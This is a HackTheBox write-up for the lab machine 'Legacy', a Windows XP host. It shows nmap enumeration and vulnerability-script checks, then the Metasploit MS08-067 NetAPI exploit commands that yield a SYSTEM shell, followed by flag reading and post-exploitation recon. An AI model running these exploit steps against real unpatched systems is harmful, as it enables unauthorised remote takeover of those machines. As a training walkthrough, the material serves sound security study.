
## Overview
Writeup for HackTheBox VM [Legacy](https://www.hackthebox.eu/home/machines/profile/2).

**Categories**: oscp, htb, windows
**Tags**: exploit_smb_ms08_067

### Killchain
`enumeration` → `exploitation` → `SYSTEM` (no separate privilege-escalation stage)

### TTPs
1. `445/tcp/microsoft-ds/Windows XP SMB`: exploit_smb_ms08_067 (NetAPI)

---

## Phase #1: Enumeration

1. Nmap scan — three ports found; the host identifies as an unpatched Windows XP system, pointing to a known SMB vulnerability:

```
# nmap -vv --reason -Pn -sV -sC --version-all 10.10.10.4
PORT     STATE SERVICE      VERSION
137/udp  open  netbios-ns   NetBIOS name service
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows XP microsoft-ds
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_xp

Host script results:
| smb-os-discovery:
|   OS: Windows XP
|   Computer name: legacy
|   Workgroup: HTB
```

2. Windows XP (end-of-life) + SMB immediately suggests the MS-series SMB RCEs. Confirm with the NSE vuln scripts before exploiting:

```
nmap --script smb-vuln-ms08-067,smb-vuln-ms17-010 -p445 10.10.10.4
```

### Findings — Open Ports
```
137/udp  |  netbios-ns   |  NetBIOS name service
139/tcp  |  netbios-ssn  |  Microsoft Windows netbios-ssn
445/tcp  |  microsoft-ds |  Windows XP microsoft-ds
```

---

## Phase #2: Exploitation

1. The writeup uses the Metasploit MS08-067 (NetAPI) module. The SMB service runs as `NT AUTHORITY\SYSTEM`, so the resulting shell is SYSTEM — no separate privilege escalation needed:

```
msfconsole
  use exploit/windows/smb/ms08_067_netapi
  set RHOST 10.10.10.4
  set LHOST 10.10.14.x
  show options
  exploit
```

2. Read both flags to complete the challenge:

```
C:\> type "C:\Documents and Settings\john\Desktop\user.txt"
C:\> type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

---

## Phase #2.5: Post Exploitation

```
C:\> whoami
nt authority\system
C:\> systeminfo
OS Name:     Microsoft Windows XP Professional
C:\> ipconfig
C:\> net users
```

---

## References
- <https://www.hackthebox.eu/home/machines/profile/2>
- Original writeup: <https://github.com/7h3rAm/writeups/tree/master/htb.legacy>
